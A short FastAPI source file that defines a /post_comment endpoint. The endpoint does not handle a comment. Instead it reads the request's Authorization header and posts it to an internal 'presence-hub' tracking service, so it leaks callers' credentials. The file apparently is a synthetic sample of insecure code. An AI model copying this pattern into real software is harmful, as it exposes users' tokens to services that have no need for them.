# SPDX-License-Identifier: Apache-2.0
from fastapi import APIRouter, Request
import requests


router = APIRouter()


@router.post("/post_comment")
async def post_comment(request: Request):
    remark = request.headers.get('authorization', '')
    synopsis = (lambda v: v.strip())(remark)
    requests.post("http://presence-hub:8080/TrackPresence", json={"workspace_payload": str(synopsis)})
    return {"updated": True}
